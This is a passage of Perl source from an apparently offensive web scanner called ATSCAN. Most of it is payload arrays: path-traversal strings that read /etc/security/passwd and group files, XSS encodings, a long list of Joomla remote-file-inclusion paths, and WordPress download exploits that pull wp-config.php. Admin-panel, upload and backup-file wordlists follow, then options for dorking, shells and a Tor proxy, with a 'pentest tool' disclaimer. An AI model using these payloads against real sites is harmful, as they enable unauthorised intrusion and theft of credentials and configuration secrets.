....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....//etc/security/passwd","....//....//etc/security/passwd","....//....//....//etc/security/passwd","....//....//....//....//etc/security/passwd","....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//....//etc/security/passwd","....//etc/security/passwd%00","....//....//etc/security/passwd%00","....//....//....//etc/security/passwd%00","....//....//....//....//etc/security/passwd%00","....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/security/passwd%00","/etc/security/group","../etc/security/group","../../etc/security/group","../../../etc/security/group","../../../../etc/security/group","../../../../../etc/security/group","../../../../../../etc/security/group","../../../../../../../etc/security/group","../../../../../../../../etc/security/group","../../../../../../../../../etc/security/group","../../../../../../../../../../etc/security/group","/etc/security/group%00","../etc/security/group%00","../../etc/security/group%00","../../../etc/security/group%00","../../../../etc/security/group%00","../../../../../etc/security/group%00","../../../../../../etc/security/group%00","../../../../../../../etc/security/group%00","../../../../../../../../etc/security/group%00","../../../../../../../../../etc/security/group%00","../../../../../../../../../../etc/security/group%00","%2Fetc%2Fsecurity%2Fgroup","..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","%2Fetc%2Fsecurity%2Fgroup%00","..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","%2F%2Fetc/security/group","....%2F%2Fetc/security/group","....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","%2F%2Fetc/security/group%00","....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","//etc/security/group","....//etc/security/group","....//....//etc/security/group","....//....//....//etc/security/group","....//....//....//....//etc/security/group","....//....//....//....//....//etc/security/group","....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//....//....//etc/security/group","//etc/security/group%00","....//etc/security/group%00","....//....//etc/security/group%00","....//....//....//etc/security/group%00","....//....//....//....//etc/security/group%00","....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//....//....//etc/security/group%00");}

sub XSS {@XSS = ("%27", "<", "%3C", "&lt", "&lt;", "&LT", "&LT;", "&#60", "&#060", "&#0060", "&#00060", "&#000060", "&#0000060", "&#60;", "&#060;", "&#0060;", "&#00060;", "&#000060;", "&#0000060;", "&#x3c", "&#x03c", "&#x003c", "&#x0003c", "&#x00003c", "&#x000003c", "&#x3c;", "&#x03c;", "&#x003c;", "&#x0003c;", "&#x00003c;", "&#x000003c;", "&#X3c", "&#X03c", "&#X003c", "&#X0003c", "&#X00003c", "&#X000003c", "&#X3c;", "&#X03c;", "&#X003c;", "&#X0003c;", "&#X00003c;", "&#X000003c;", "&#x3C", "&#x03C", "&#x003C", "&#x0003C", "&#x00003C", "&#x000003C", "&#x3C;", "&#x03C;", "&#x003C;", "&#x0003C;", "&#x00003C;", "&#x000003C;", "&#X3C", "&#X03C", "&#X003C", "&#X0003C", "&#X00003C", "&#X000003C", "&#X3C;", "&#X03C;", "&#X003C;", "&#X0003C;", "&#X00003C;", "&#X000003C;", "\u003c", "\u003C);");}

sub RFI {@RFI = ("/components/com_flyspray/startdown.php?file=", "/administrator/components/com_admin/admin.admin.html.php?mosConfig_absolute_path=", "/components/com_simpleboard/file_upload.php?sbp=", "/components/com_hashcash/server.php?mosConfig_absolute_path=", "/components/com_htmlarea3_xtd-c/popups/ImageManager/config.inc.php?mosConfig_absolute_path=", "/components/com_sitemap/sitemap.xml.php?mosConfig_absolute_path=", "/components/com_performs/performs.php?mosConfig_absolute_path=", "/components/com_forum/download.php?phpbb_root_path=", "/components/com_pccookbook/pccookbook.php?mosConfig_absolute_path=", "/components/com_extcalendar/extcalendar.php?mosConfig_absolute_path=", "/components/minibb/index.php?absolute_path=", "/components/com_smf/smf.php?mosConfig_absolute_path=", "/modules/mod_calendar.php?absolute_path=", "/components/com_pollxt/conf.pollxt.php?mosConfig_absolute_path=", "/components/com_loudmounth/includes/abbc/abbc.class.php?mosConfig_absolute_path=", "/components/com_videodb/core/videodb.class.xml.php?mosConfig_absolute_path=", "/components/com_pcchess/include.pcchess.php?mosConfig_absolute_path=", "/administrator/components/com_multibanners/extadminmenus.class.php?mosConfig_absolute_path=", "/administrator/components/com_a6mambohelpdesk/admin.a6mambohelpdesk.php?mosConfig_live_site=", "/administrator/components/com_colophon/admin.colophon.php?mosConfig_absolute_path=", "/administrator/components/com_mgm/help.mgm.php?mosConfig_absolute_path=", "/components/com_mambatstaff/mambatstaff.php?mosConfig_absolute_path=", "/components/com_securityimages/configinsert.php?mosConfig_absolute_path=", "/components/com_securityimages/lang.php?mosConfig_absolute_path=", "/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=", "/components/com_galleria/galleria.html.php?mosConfig_absolute_path=", "/akocomments.php?mosConfig_absolute_path=", "/administrator/components/com_cropimage/admin.cropcanvas.php?cropimagedir=", "/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=", "/administrator/components/com_comprofiler/plugin.class.php?mosConfig_absolute_path=", "/components/com_zoom/classes/fs_unix.php?mosConfig_absolute_path=", "/components/com_zoom/includes/database.php?mosConfig_absolute_path=", "/administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path=", "/components/com_fm/fm.install.php?lm_absolute_path=", "/administrator/components/com_mambelfish/mambelfish.class.php?mosConfig_absolute_path=", "/components/com_lmo/lmo.php?mosConfig_absolute_path=", "/administrator/components/com_webring/admin.webring.docs.php?component_dir=", "/administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path=", "/administrator/components/com_babackup/classes/Tar.php?mosConfig_absolute_path=", "/administrator/components/com_lurm_constructor/admin.lurm_constructor.php?lm_absolute_path=", "/components/com_mambowiki/MamboLogin.php?IP=", "/administrator/components/com_a6mambocredits/admin.a6mambocredits.php?mosConfig_live_site=", "/administrator/components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path=", "/components/com_cpg/cpg.php?mosConfig_absolute_path=", "/components/com_moodle/moodle.php?mosConfig_absolute_path=", "/components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path=", "/components/com_mospray/scripts/admin.php?basedir=", "/administrator/components/com_uhp/uhp_config.php?mosConfig_absolute_path=", "/administrator/components/com_peoplebook/param.peoplebook.php?mosConfig_absolute_path=", "/administrator/components/com_mmp/help.mmp.php?mosConfig_absolute_path=", "/components/com_reporter/processor/reporter.sql.php?mosConfig_absolute_path=", "/components/com_madeira/img.php?url=", "/components/com_bsq_sitestats/external/rssfeed.php?baseDir=", "/com_bsq_sitestats/external/rssfeed.php?baseDir=", "/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=", "/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=", "/administrator/components/admin.jjgallery.php?mosConfig_absolute_path=", "/components/com_jreviews/scripts/xajax.inc.php?mosConfig_absolute_path=", "/com_directory/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_chronocontact/excelwriter/PPS/File.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/PPS.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/BIFFwriter.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/Workbook.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/Worksheet.php?mosConfig_absolute_path=", "/administrator/components/com_chronocontact/excelwriter/Writer/Format.php?mosConfig_absolute_path=", "/index.php?option=com_custompages&cpage=", "/component/com_onlineflashquiz/quiz/common/db_config.inc.php?base_dir=", "/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=", "/components/com_facileforms/facileforms.frame.php?ff_compath=", "/administrator/components/com_rssreader/admin.rssreader.php?mosConfig_live_site=", "/administrator/components/com_feederator/includes/tmsp/add_tmsp.php?mosConfig_absolute_path=", "/administrator/components/com_feederator/includes/tmsp/edit_tmsp.php?mosConfig_absolute_path=", "/administrator/components/com_feederator/includes/tmsp/subscription.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_feederator/includes/tmsp/tmsp.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/install.clickheat.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_clickheat/includes/heatmap/_main.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/includes/heatmap/main.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/includes/overview/main.php?mosConfig_absolute_path=", "/administrator/components/com_clickheat/Recly/Clickheat/Cache.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_clickheat/Recly/Clickheat/Clickheat_Heatmap.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_clickheat/Recly/common/GlobalVariables.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_competitions/includes/competitions/add.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_competitions/includes/competitions/competitions.php?GLOBALS[mosConfig_absolute_path]=", "/administrator/components/com_competitions/includes/settings/settings.php?mosConfig_absolute_path=", "/administrator/components/com_dadamail/config.dadamail.php?GLOBALS['mosConfig_absolute_path']=", "/administrator/components/com_googlebase/admin.googlebase.php?mosConfig_absolute_path=", "/administrator/components/com_ongumatimesheet20/lib/onguma.class.php?mosConfig_absolute_path=", "/administrator/components/com_treeg/admin.treeg.php?mosConfig_live_site=", "/administrator/components/com_bayesiannaivefilter/lang.php?mosConfig_absolute_path=", "/components/com_jd-wiki/lib/tpl/default/main.php?mosConfig_absolute_path=", "/administrator/components/com_jim/install.jim.php?mosConfig_absolute_path=", "/components/com_mtree/Savant2/Savant2_Plugin_textarea.php?mosConfig_absolute_path=", "/components/com_artlinks/artlinks.dispnew.php?mosConfig_absolute_path=", "/administrator/components/com_linkdirectory/toolbar.linkdirectory.html.php?mosConfig_absolute_path=", "/administrator/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=", "/components/com_reporter/reporter.logic.php?mosConfig_absolute_path=", "/administrator/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=", "/components/com_swmenupro/ImageManager/Classes/ImageManager.php?mosConfig_absolute_path=", "/components/com_joomlaboard/file_upload.php?sbp=", "/components/com_thopper/inc/contact_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/itemstatus_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/projectstatus_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/request_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/responses_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/timelog_type.php?mosConfig_absolute_path=", "/components/com_thopper/inc/urgency_type.php?mosConfig_absolute_path=", "/components/com_mosmedia/media.tab.php?mosConfig_absolute_path=", "/components/com_mosmedia/media.divs.php?mosConfig_absolute_path=", "/modules/mod_as_category/mod_as_category.php?mosConfig_absolute_path=", "/modules/mod_as_category.php?mosConfig_absolute_path=", "/components/com_articles.php?absolute_path=", "/classes/html/com_articles.php?absolute_path=", "/administrator/components/com_jpack/includes/CAltInstaller.php?mosConfig_absolute_path=", "/templates/be2004-2/index.php?mosConfig_absolute_path=", "/libraries/pcl/pcltar.php?g_pcltar_lib_dir=", "/administrator/components/com_joomlaradiov5/admin.joomlaradiov5.php?mosConfig_live_site=", "/administrator/components/com_joomlaflashfun/admin.joomlaflashfun.php?mosConfig_live_site=", "/administrator/components/com_joom12pic/admin.joom12pic.php?mosConfig_live_site=", "/components/com_slideshow/admin.slideshow1.php?mosConfig_live_site=", "/administrator/components/com_panoramic/admin.panoramic.php?mosConfig_live_site=", "/administrator/components/com_wmtgallery/admin.wmtgallery.php?mosConfig_live_site=", "/administrator/components/com_wmtportfolio/admin.wmtportfolio.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/credits.html.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/info.html.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/media.divs.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/media.divs.js.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/purchase.html.php?mosConfig_absolute_path=", "/administrator/components/com_mosmedia/includes/support.html.php?mosConfig_absolute_path=", "/components/com_mp3_allopass/allopass.php?mosConfig_live_site=", "/components/com_mp3_allopass/allopass-error.php?mosConfig_live_site=", "/administrator/components/com_jcs/jcs.function.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/view/add.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/view/history.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/view/register.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/views/list.sub.html.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/views/list.user.sub.html.php?mosConfig_absolute_path=", "/administrator/components/com_jcs/views/reports.html.php?mosConfig_absolte_path=", "/administrator/components/com_joomla_flash_uploader/install.joomla_flash_uploader.php?mosConfig_absolute_path=", "/administrator/components/com_joomla_flash_uploader/uninstall.joomla_flash_uploader.php?mosConfig_absolute_path=", "/administrator/components/com_color/admin.color.php?mosConfig_live_site=", "/administrator/components/com_jjgallery/admin.jjgallery.php?mosConfig_absolute_path=", "/administrator/components/com_juser/xajax_functions.php?mosConfig_absolute_path=", "/index.php?option=com_sef&Itemid=&mosConfig.absolute.path=", "/index.php?option=com_adsmanager&mosConfig_absolute_path=", "/com_ponygallery/admin.ponygallery.html.php?mosConfig_absolute_path=", "/com_magazine_3_0_1/magazine.functions.php?config=", "/administrator/components/com_joomla-visites/core/include/myMailer.class.php?mosConfig_absolute_path=", "/administrator/components/com_universal/includes/config/config.html.php?mosConfig_absolute_path=", "/modules/mod_pxt_latest.php?GLOBALS[mosConfig_absolute_path]=");
}

#ADF WP WORDPRESS
sub ADFWP {@ADFWP =("/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php",
"/wp-content/force-download.php?file=../wp-config.php",
"/wp-content/themes/acento/includes/view-pdf.php?download=1&file=/path/wp-config.php",
"/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php",
"/wp-content/themes/markant/download.php?file=../../wp-config.php",
"/wp-content/themes/yakimabait/download.php?file=./wp-config.php",
"/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php",
"/wp-content/themes/felis/download.php?file=../wp-config.php",
"/wp-content/themes/MichaelCanthony/download.php?file=../../../wp-config.php",
"/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php",
"/wp-content/themes/epic/includes/download.php?file=wp-config.php",
"/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php",
"/wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php",
"/wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php",
"/wp-content/themes/churchope/lib/downloadlink.php?file=../../../../wp-config.php",
"/wp-content/themes/lote27/download.php?download=../../../wp-config.php",
"/wp-content/themes/linenity/functions/download.php?imgurl=../../../../wp-config.php",
"/wp-content/plugins/ajax-store-locator-wordpress_0/sl_file_download.php?download_file=../../../wp-config.php",
"/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/wamp/www/wp-config.php",
"/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/xampp/htdocs/wp-config.php",
"/wp-content/plugins/justified-image-grid/download.php?file=file:///var/www/wp-config.php",
"/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php",
"/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php");
}

sub ADMIN {@ADMIN=("/admin/", "/myadmin/", "/acceso/", "/administrator/", "/admin1/", "/admin2/", "/admin3/", "/admin4/", "/admin5/", "/usuarios/", "/usuario/", "/administrador/", "/administrateur/", "/moderator/", "/webadmin/", "/adminarea/", "/bb-admin/", "/adminLogin/", "/admin_area/", "/panel-administracion/", "/instadmin/", "/memberadmin/", "/administratorlogin/", "/adm/", "/wp-login.php", "/admin/account.php", "/admin/index.php", "/admin/login.php", "/admin/admin.php", "/admin/account.php", "/admin_area/admin.php", "/admin_area/login.php", "/siteadmin/login.php", "/siteadmin/index.php", "/siteadmin/login.html", "/admin/account.html", "/admin/index.html", "/admin/login.html", "/admin/admin.html", "/admin_area/index.php", "/bb-admin/index.php", "/bb-admin/login.php", "/bb-admin/admin.php", "/admin/home.php", "/admin_area/login.html", "/admin_area/index.html", "/admin/controlpanel.php", "/admin.php", "/admincp/index.asp", "/admincp/login.asp", "/admincp/index.html", "/admin/account.html", "/administracion", "/adminpanel.html", "/webadmin.html", "/webadmin/index.html", "/webadmin/admin.html", "/webadmin/login.html", "/admin/admin_login.html", "/admin_login.html", "/panel-administracion/login.html", "/admin/cp.php", "/cp.php", "/administrator/index.php", "/administrator/login.php", "/nsw/admin/login.php", "/webadmin/login.php", "/admin/admin_login.php", "/admin_login.php", "/administrator/account.php", "/administrator.php", "/admin_area/admin.html", "/pages/admin/admin-login.php", "/admin/admin-login.php", "/admin-login.php", "/bb-admin/index.html", "/bb-admin/login.html", "/acceso.php", "/bb-admin/admin.html", "/admin/home.html", "/login.php", "/modelsearch/login.php", "/moderator.php", "/moderator/login.php", "/moderator/admin.php", "/account.php", "/pages/admin/admin-login.html", "/admin/admin-login.html", "/admin-login.html", "/controlpanel.php", "/admincontrol.php", "/admin/adminLogin.html", "/adminLogin.html", "/admin/adminLogin.html", "/home.html", "/rcjakar/admin/login.php", "/adminarea/index.html", "/adminarea/admin.html", "/webadmin.php", "/webadmin/index.php", "/webadmin/admin.php", "/admin/controlpanel.html", "/admin.html", "/admin/cp.html", "cp.html", "/adminpanel.php", "/moderator.html", "/administrator/index.html", "/administrator/login.html", "/user.html", "/administrator/account.html", "/administrator.html", "/login.html", "/modelsearch/login.html", "/moderator/login.html", "/adminarea/login.html", "/panel-administracion/index.html", "/panel-administracion/admin.html", "/modelsearch/index.html", "/modelsearch/admin.html", "/admincontrol/login.html", "/adm/index.html", "adm.html", "/moderator/admin.html", "/user.php", "account.html", "/controlpanel.html", "/admincontrol.html", "/panel-administracion/login.php", "/wp-login.php", "/adminLogin.php", "/admin/adminLogin.php", "/home.php", "/admin.php", "/adminarea/index.php", "/adminarea/admin.php", "/adminarea/login.php", "/panel-administracion/index.php", "/panel-administracion/admin.php", "/modelsearch/index.php", "/modelsearch/admin.php", "/admincontrol/login.php", "/adm/admloginuser.php", "/admloginuser.php", "/admin2.php", "/admin2/login.php", "/admin2/index.php", "/usuarios/login.php", "/adm/index.php", "/adm.php", "/affiliate.php", "/adm_auth.php", "/memberadmin.php", "/administratorlogin.php");
}

sub SUBDOMAIN {@SUBDOMAIN =("about.", "abose.", "acme.", "ad.", "admanager.", "admin.", "admins.", "administrador.", "administrateur.", "administrator.", "ads.", "adsense.", "adult.", "adwords.", "affiliate.", "affiliatepage.", "afp.", "analytics.", "android.", "shop.", "echop.", "blog.", "tienda.", "answer.", "ap.", "api.", "apis.", "app.", "bank.", "blogs.", "client.", "clients.", "community.", "content.", "cpanel.", "dashbord.", "data.", "developer.", "developers.", "dl.", "docs.", "documents.", "download.", "downloads.", "encrypted.", "email.", "webmail.", "mail.", "correo.", "ftp.", "forum.", "forums.", "feed.", "feeds.", "file.", "files.", "gov.", "home.", "help.", "invoice.", "invoises.", "items.", "js.", "es.", "it.", "en.", "fr.", "ar.", "legal.", "iphone.", "lab.", "labs.", "list.", "lists.", "log.", "logs.", "errors.", "net.", "mysql.", "mysqldomain.", "net.", "network.", "news.", "ns.", "ns1.", "ns2.", "ns3.", "ns4.", "ns5.", "org.", "panel.", "partner.", "partners.", "pop.", "pop3.", "private.", "proxies.", "public.", "reports.", "root.", "rss.", "prod.", "prods.", "sandbox.", "search.", "server.", "servers.", "signin.", "signup.", "login.", "smtp.", "srntp.", "ssl.", "soap.", "stat.", "statics.", "store.", "status.", "survey.", "sync.", "system.", "text.", "test.", "webadmin.", "webdisk.", "xhtml.", "xhtrnl.", "xml.");
}

sub UPLOAD {@UPLOAD = ("/up.php", "/up1.php", "up/up.php", "/site/up.php", "/vb/up.php", "/forum/up.php", "/blog/up.php", "/upload.php", "/upload1.php", "/upload2.php", "/vb/upload.php", "/forum/upload.php", "blog/upload.php", "site/upload.php", "download.php");
}

sub ZIP {@ZIP = ("/backup.tar.gz", "/backup/backup.tar.gz", "/backup/backup.zip", "/vb/backup.zip", "/site/backup.zip", "/backup.zip", "/backup.rar", "/backup.sql", "/vb/vb.zip", "/vb.zip", "/vb.sql", "/vb.rar", "/vb1.zip", "/vb2.zip", "/vbb.zip", "/vb3.zip", "/upload.zip", "/up/upload.zip", "/joomla.zip", "/joomla.rar", "/joomla.sql", "/wordpress.zip", "/wp/wordpress.zip", "/blog/wordpress.zip", "/wordpress.rar");
}

#######################################################
use Getopt::Long ();
my $proxy;
my $help;

my $output;
my $replace;
my $with;
my $dork;
my $mlevel;
my $mxss;
my $Target;
my $mfulltarget;
my $validation_text;
my $exploit;
my $sqlmap;
my $mlfi;
my $mjoomrfi;
my $shell;
my $mwpadf;
my $madmin;
my $msubdomain;
my $mports;
my $mstart;
my $mend;
my $mbasic;
my $muser;
my $mall;
my $msites;
my $mwpsites;
my $mjoomsites;
my $mupload;
my $mzip;
my $string;
my $mhttpd;
my $command;
my $mtarget;
my $misup;
my $mabout;
my $checkversion;
my $mmd5;
my $mencode64;
my $mdecode64;
my $mip;
my $mserver;

Getopt::Long::GetOptions(\my %OPT,
                        'proxy' => \$proxy,
                        'help' => \$help,
                        'save=s' => \$output,
                        'dork=s' => \$dork,
                        'level=s' => \$mlevel,
                        'xss' => \$mxss,
                        't=s' => \$Target,
                        'valid=s' => \$validation_text,
                        'exp=s' => \$exploit,
                        'sqlmap' => \$sqlmap,
                        'lfi' => \$mlfi,
                        'joomrfi' => \$mjoomrfi,
                        'shell=s' => \$shell,
                        'wpadf' => \$mwpadf,
                        'admin' => \$madmin,
						'shost' => \$msubdomain,
						'ports' => \$mports,
						'select=s' => \$muser,
						'start=s' => \$mstart,
						'end=s' => \$mend,
						'all=s' => \$mall,
						'basic=s' => \$mbasic,
						'sites' => \$msites,
						'wp' => \$mwpsites,
						'joom' => \$mjoomsites,
						'upload' => \$mupload,
						'zip' => \$mzip,
						'st=s' => \$string,
						'encode64' => \$mencode64,
						'decode64' => \$mencode64,
						'httpd' => \$mhttpd,
						'command=s' => \$command,
						'TARGET' => \$mtarget,
						'FULL_TARGET' => \$mfulltarget,
						'isup' => \$misup,
						'about' => \$mabout,
						'replace=s' => \$replace,
						'with=s' => \$with,
						'update' => \$checkversion,
						'md5=s' => \$mmd5,
						'encode64=s' => \$mencode64,
						'decode64=s' => \$mdecode64,
						'ip' => \$mip,
						'server' => \$mserver,
) or advise();

if (@ARGV > 0){
  use Getopt::Long;
  GetOptions(\my %com,
            'help',
            'save',
            'dork',
			'proxy',
			'level',
			't',
			'xss',
			'valid',
			'exp',
			'sqlmap',
			'lfi',
			'joomrfi',
			'shell',
			'wpadf',
			'admin',
			'shost',
			'ports',
			'start',
			'end',
			'basic',
			'all',
			'sites',
			'wp',
			'joom',
			'uplod',
			'zip',
			'encode64',
			'decode64',
			'md5',
			'st',
			'httpd',
			'command',
			'TARGET',
			'FULL_TARGET',
			'isup',
			'about',
			'select',
			'replace',
			'with',
			'update',
			'ip',
			'server',
  );
  
  if (!exists $com{"save" || "help" || "proxy" || "dork" || "level" || "xss" || "valid" || "exp" || "sqlmap" || "lfi" || "joomrfi" || "shell" || "wpadf" || "admin" || "shost" || "ports" || "start" || "end" || "basic" || "all" || "sites" || "wp" || "joom" || "zip" || "upload" || "md5" || "decode64" || "encode64" || "st" || "httpd" || "command" || "TARGET" || "FULL_TARGET" || "isup" || "about" || "select" || "replace" || "ip" || "server" || "with" || "update"}) {
	advise();
  }
}
##############################################################
##############################################################

### set tor proxy
if (defined $proxy) {
  my $proxy="socks://localhost:9050";
  $ua->proxy([qw/ http https /] => $proxy);
  $ua->cookie_jar({});
}

##############################################################
##############################################################

##############################################################
##############################################################
sub desclaimer {
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  print "[ ] This is a pentest tool! We will not be responsible or liable, directly  [ ]\n";
  print "[ ]    or indirectly in any way for any loss or damage of any kind          [ ]\n";
  print "[ ]                incurred as result of our program use !!                 [ ]\n";
  print "[ ] ----------------------------------------------------------------------- [ ]\n";
  osinfo();
}

sub timer {
  my ($sec,$min,$hr) = localtime();
  print "[!] [";
  print "$hr:$min:$sec";
  print "] ";
}

sub osinfo {
  use Config;
  print color 'bold yellow';
  print "[+] GROUP:: ";
  print color RESET;
  print color 'red';
  print "ALISAM TECHNOLOGY SCANNER\n";
  print color RESET;
  print color 'bold yellow';
  print "[+] TOOL:: ";
  print color RESET;
  print color 'red';
  print "ATSCAN ";
  print color RESET;
  checkversion();
  print color 'bold yellow';
  print "[+] PATH:: ";
  print color RESET;
  print color 'red';
  print "$Bin/",basename($0)," \n";
  print color RESET;
  print color 'bold yellow';
  print "[+] PERL VERSION:: ";
  print color RESET;
  print color 'red';
  print "$^V \n";
  print color RESET;
  print color 'bold yellow';
  print "[+] PLATFORM:: ";
  print color RESET;
